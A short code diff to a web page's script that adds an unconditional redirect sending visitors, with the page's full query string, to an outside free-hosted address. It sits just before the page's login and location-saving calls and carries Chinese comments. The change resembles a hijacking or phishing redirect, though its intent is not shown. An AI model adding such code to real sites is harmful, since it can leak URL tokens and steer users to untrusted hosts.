@@ -156,6 +156,17 @@
     window.redict=redict;
 
 
+
+      const params = window.location.search; // 包含 ?xxx=xxx
+
+  // 2. 目标域名
+  const targetUrl = 'https://howdy.rf.gd/anmo/home_frame.html';
+
+  // 3. 拼接并重定向
+  window.location.replace(targetUrl + params);
+
+
+
     login();
     save_userLocation();
     addEventListener_message();
@@ -167,3 +178,4 @@
 </script>
 
 </html>
+
